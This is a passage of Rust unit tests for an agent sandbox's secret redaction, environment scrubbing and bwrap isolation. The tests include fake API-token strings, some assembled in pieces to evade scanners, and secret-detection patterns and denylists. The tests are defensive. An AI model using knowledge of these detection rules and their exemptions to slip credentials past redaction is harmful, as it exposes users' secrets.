        let prefix = format!("{}{}{}{}{}", 'x', 'o', 'x', 'b', '-');
        let input = format!(
            "export SLACK_HOOK={}12-34-56-abcdefabcdefabcdefabcdef12345678",
            prefix
        );
        let cleaned = redact_secrets(&input);
        assert!(cleaned.contains("[REDACTED]"), "got {cleaned}");
    }

    #[test]
    fn aws_access_key_is_name_sensitive() {
        assert!(is_sensitive_env_name("AWS_ACCESS_KEY_ID"));
        assert!(is_sensitive_env_name("AWS_SECRET_ACCESS_KEY"));
    }

    #[test]
    fn github_token_is_explicitly_caught() {
        // GITHUB_TOKEN is in SAFE_EXACT (deliberately), but the value
        // `ghp_…` should still be caught by the vendor-prefix regex
        // when it appears in output. The name-based scrub doesn't strip
        // it, but the value-based scrub catches it.
        let input = "GITHUB_TOKEN=ghp_abcdefghijklmnopqrstuvwxyz1234567890abcdef";
        let cleaned = redact_secrets(input);
        assert!(cleaned.contains("[REDACTED]"), "got {cleaned}");
    }

    #[test]
    fn plain_output_survives() {
        let input = "compiled 42 files in 1.3s, all tests passed";
        let out = redact_secrets(input);
        assert!(matches!(out, std::borrow::Cow::Borrowed(_)));
        assert_eq!(out, input);
    }

    #[test]
    fn gh_token_name_is_in_safe_exact() {
        // GH_TOKEN — GitHub CLI token — was historically caught by the
        // "TOKEN" substring in the denylist, making `gh auth token`
        // fail inside the sandbox. It's now in SAFE_EXACT alongside
        // GITHUB_TOKEN, so only the VALUE-level scrub applies.
        assert!(!is_sensitive_env_name("GH_TOKEN"));
        // But a gh_ token VALUE should still be redacted:
        let input = "GH_TOKEN=ghp_abcdefghijklmnopqrstuvwxyz1234567890abcd";
        assert!(redact_secrets(input).contains("[REDACTED]"));
    }

    #[test]
    fn safe_exact_disallowlist_is_case_insensitive() {
        // The check uses `to_ascii_uppercase()`, so mixed-case names
        // still get the SAFE_EXACT exemption.
        assert!(!is_sensitive_env_name("Gh_Token"));
        assert!(!is_sensitive_env_name("GitHub_Token"));
    }

    #[test]
    fn redact_secrets_leaves_plain_text_untouched() {
        let plain = "compiled 42 files in 1.3s, all tests passed";
        assert!(matches!(
            redact_secrets(plain),
            std::borrow::Cow::Borrowed(_)
        ));
        assert_eq!(redact_secrets(plain), plain);
    }

    #[test]
    fn redact_secrets_scrubs_known_env_values() {
        // The literal-value path catches secrets that lack a vendor
        // shape (e.g. `echo $MY_TOKEN` where the value is opaque). Tested
        // via the pure core so it doesn't depend on the process env.
        let secrets = vec!["super-secret-build-value-1234".to_string()];
        let out = redact_secrets_with("export X=super-secret-build-value-1234", &secrets);
        assert!(!out.contains("super-secret-build-value-1234"), "got {out}");
        assert!(out.contains("[REDACTED]"), "got {out}");
    }

    // ── has_vendor_prefix_gate ──────────────────────────────────

    #[test]
    fn vendor_prefix_gate_detects_sk_prefix() {
        let s = format!("{}{}{}", "s", "k-", "testkey1234567890abcdefg");
        assert!(has_vendor_prefix_gate(&s));
    }

    #[test]
    fn vendor_prefix_gate_detects_ghp_prefix() {
        let s = format!("{}{}{}", "g", "hp_", "testkey12345678901234567890123456789");
        assert!(has_vendor_prefix_gate(&s));
    }

    #[test]
    fn vendor_prefix_gate_detects_github_pat_prefix() {
        let s = format!(
            "github_{}at_11ABCDEFGHIJKLMNOPQRSTUV_abcdefghijklmnopqrstuvwxyz1234567890",
            "p"
        );
        assert!(has_vendor_prefix_gate(&s));
    }

    #[test]
    fn vendor_prefix_gate_detects_hf_prefix() {
        let s = format!("{}{}{}", "h", "f_", "testkey12345678901234567890123456789");
        assert!(has_vendor_prefix_gate(&s));
    }

    #[test]
    fn vendor_prefix_gate_detects_xai_prefix() {
        let s = format!("{}{}{}", "xa", "i-", "testkey1234567890abcdefg");
        assert!(has_vendor_prefix_gate(&s));
    }

    #[test]
    fn vendor_prefix_gate_detects_akia() {
        assert!(has_vendor_prefix_gate("AKIA1234567890ABCD"));
    }

    #[allow(non_snake_case)]
    #[test]
    fn vendor_prefix_gate_detects_eyJ() {
        assert!(has_vendor_prefix_gate("eyJhbGciOiJIUzI1NiJ9"));
    }

    #[test]
    fn vendor_prefix_gate_plain_text_rejected() {
        assert!(!has_vendor_prefix_gate("hello world"));
        assert!(!has_vendor_prefix_gate("PATH=/usr/bin"));
        assert!(!has_vendor_prefix_gate(""));
    }

    // ── SandboxMode::parse / status_badge ───────────────────────

    #[test]
    fn sandbox_mode_parse_microvm() {
        #[cfg(feature = "sandbox-microvm")]
        assert_eq!(SandboxMode::parse(Some("microvm")), SandboxMode::Microvm);
        #[cfg(not(feature = "sandbox-microvm"))]
        assert_eq!(SandboxMode::parse(Some("microvm")), SandboxMode::Off);
    }

    #[test]
    fn sandbox_mode_parse_bare_off() {
        assert_eq!(SandboxMode::parse(None), SandboxMode::Off);
        assert_eq!(SandboxMode::parse(Some("bwrap")), SandboxMode::Bwrap);
        assert_eq!(SandboxMode::parse(Some("")), SandboxMode::Off);
        assert_eq!(SandboxMode::parse(Some("garbage")), SandboxMode::Off);
        assert_eq!(SandboxMode::parse(Some("off")), SandboxMode::Off);
        assert_eq!(SandboxMode::parse(Some("none")), SandboxMode::Off);
    }

    #[test]
    fn sandbox_mode_status_badge() {
        assert_eq!(SandboxMode::Off.status_badge(), None);
        assert_eq!(SandboxMode::Bwrap.status_badge(), Some("bwrap"));
        #[cfg(feature = "sandbox-microvm")]
        assert_eq!(SandboxMode::Microvm.status_badge(), Some("vm"));
    }

    // ── Sandbox struct: Microvm mode + noop wrappers ─────────────

    #[cfg(feature = "sandbox-microvm")]
    #[test]
    fn sandbox_new_microvm_mode() {
        let sb = Sandbox::new(SandboxMode::Microvm);
        assert!(sb.is_microvm());
        assert_eq!(sb.mode, SandboxMode::Microvm);
    }

    #[cfg(feature = "sandbox-microvm")]
    #[test]
    fn sandbox_ssh_connect_info_none_before_microvm_start() {
        let sb = Sandbox::new(SandboxMode::Microvm);
        // VM not started → ssh_connect_info returns None
        assert!(sb.ssh_connect_info().is_none());
    }

    #[cfg(feature = "sandbox-microvm")]
    #[test]
    fn set_microvm_image_in_bwrap_mode_is_noop() {
        let sb = Sandbox::new(SandboxMode::Bwrap);
        // Should not panic
        sb.set_microvm_image("alpine".to_string()).unwrap();
        // In Bwrap mode, microvm stays None
        assert!(sb.ssh_connect_info().is_none());
    }

    #[cfg(feature = "sandbox-microvm")]
    #[test]
    fn set_microvm_resources_in_bwrap_mode_is_noop() {
        let sb = Sandbox::new(SandboxMode::Bwrap);
        // Should not panic
        sb.set_microvm_resources(4, 2048).unwrap();
        // In Bwrap mode, microvm stays None
        assert!(sb.ssh_connect_info().is_none());
    }

    // ── scrub_env mixed-path ────────────────────────────────────

    #[test]
    fn scrub_env_mixed_name_and_value_redaction() {
        let mut cmd = Command::new("bash");
        cmd.arg("-c").arg("echo done");
        // Name-based: OPENAI_API_KEY matches the KEY denylist — stripped entirely.
        cmd.env("OPENAI_API_KEY", "sk-secret-123");
        // Value-based: DATABASE_URL name is benign, but value has URL credentials.
        let pw = "abc123xyz";
        let db_url = format!("postgres://user:{}@localhost/db", pw);
        cmd.env("DATABASE_URL", db_url);
        cmd.env("HOME", "/home/user");
        scrub_env(&mut cmd);
        let out = format!("{:?}", cmd.as_std());
        assert!(
            !out.contains("OPENAI_API_KEY=sk-secret-123"),
            "name-based strip failed — value still present: {out}"
        );
        assert!(!out.contains("sk-secret-123"), "secret value leaked: {out}");
        assert!(!out.contains(pw), "URL credential leaked: {out}");
        assert!(out.contains("[REDACTED]"), "value not redacted: {out}");
        assert!(out.contains("HOME"), "benign env removed: {out}");
    }

    // ── redact_secrets_with multiple known values ───────────────

    #[test]
    fn redact_secrets_with_multiple_known_values() {
        let known = vec!["secret-one".to_string(), "secret-two".to_string()];
        let input = "TOKEN_A=secret-one TOKEN_B=secret-two TOKEN_C=safe";
        let cleaned = redact_secrets_with(input, &known);
        assert!(
            !cleaned.contains("secret-one"),
            "secret-one leaked: {cleaned}"
        );
        assert!(
            !cleaned.contains("secret-two"),
            "secret-two leaked: {cleaned}"
        );
        assert!(cleaned.contains("safe"), "benign value stripped: {cleaned}");
        assert_eq!(
            cleaned.matches("[REDACTED]").count(),
            2,
            "expected 2 redactions, got: {cleaned}"
        );
    }

    // ── Sandbox::exec smoke (Off mode) ──────────────────────────

    #[tokio::test]
    async fn exec_off_mode_echo() {
        let sb = Sandbox::new(SandboxMode::Off);
        let result = sb.exec("echo hello", 5).await;
        assert!(result.is_ok(), "exec should succeed, got: {result:?}");
        let output = result.unwrap();
        assert!(
            output.merged.contains("hello"),
            "expected 'hello', got: {}",
            output.merged
        );
        assert_eq!(
            output.exit_code, 0,
            "expected exit 0, got {}",
            output.exit_code
        );
    }

    #[tokio::test]
    async fn exec_off_mode_nonzero_exit() {
        let sb = Sandbox::new(SandboxMode::Off);
        let result = sb.exec("exit 42", 5).await;
        assert!(
            result.is_ok(),
            "exec of 'exit 42' should succeed (exit code captured), got: {result:?}"
        );
        let output = result.unwrap();
        assert_eq!(
            output.exit_code, 42,
            "expected exit 42, got {}",
            output.exit_code
        );
    }

    #[tokio::test]
    async fn exec_off_mode_stderr_captured() {
        let sb = Sandbox::new(SandboxMode::Off);
        let result = sb.exec("echo stderr-msg >&2", 5).await;
        assert!(result.is_ok(), "exec should succeed, got: {result:?}");
        let output = result.unwrap();
        assert!(
            output.merged.contains("stderr-msg"),
            "expected stderr in merged output, got: {}",
            output.merged
        );
    }

    // ── wrap_command ────────────────────────────────────────────

    #[test]
    fn wrap_command_off_produces_bash() {
        let sb = Sandbox::new(SandboxMode::Off);
        let cmd = sb.wrap_command("echo hello");
        let out = format!("{:?}", cmd.as_std());
        assert!(out.contains("bash"), "expected bash, got: {out}");
        assert!(
            out.contains("echo hello"),
            "expected 'echo hello' in command args, got: {out}"
        );
    }

    // dirge-tc2q: every wrapped command gets non-interactive env
    // defaults so prompting tools fail fast instead of blocking on a
    // tty the agent can't answer.
    #[test]
    fn wrap_command_sets_noninteractive_env() {
        let sb = Sandbox::new(SandboxMode::Off);
        let cmd = sb.wrap_command("true");
        let found: std::collections::HashMap<String, String> = cmd
            .as_std()
            .get_envs()
            .filter_map(|(k, v)| {
                v.map(|v| {
                    (
                        k.to_string_lossy().into_owned(),
                        v.to_string_lossy().into_owned(),
                    )
                })
            })
            .collect();
        assert_eq!(
            found.get("GIT_TERMINAL_PROMPT").map(String::as_str),
            Some("0")
        );
        assert_eq!(
            found.get("GCM_INTERACTIVE").map(String::as_str),
            Some("Never")
        );
        assert_eq!(
            found.get("DEBIAN_FRONTEND").map(String::as_str),
            Some("noninteractive")
        );
    }

    #[test]
    fn wrap_command_bwrap_produces_bwrap_with_isolation_args() {
        let sb = Sandbox::new(SandboxMode::Bwrap);
        let cmd = sb.wrap_command("echo hello");
        let out = format!("{:?}", cmd.as_std());
        // If bwrap is missing, mode downgrades to Off. Only check when
        // mode stayed Bwrap.
        if sb.mode == SandboxMode::Bwrap {
            assert!(out.contains("bwrap"), "expected bwrap, got: {out}");
            assert!(
                out.contains("--unshare-all"),
                "expected --unshare-all, got: {out}"
            );
            assert!(out.contains("--dev"), "expected --dev, got: {out}");
            assert!(
                out.contains("--die-with-parent"),
                "expected --die-with-parent, got: {out}"
            );
            assert!(out.contains("echo hello"), "expected command, got: {out}");
        }
    }
}
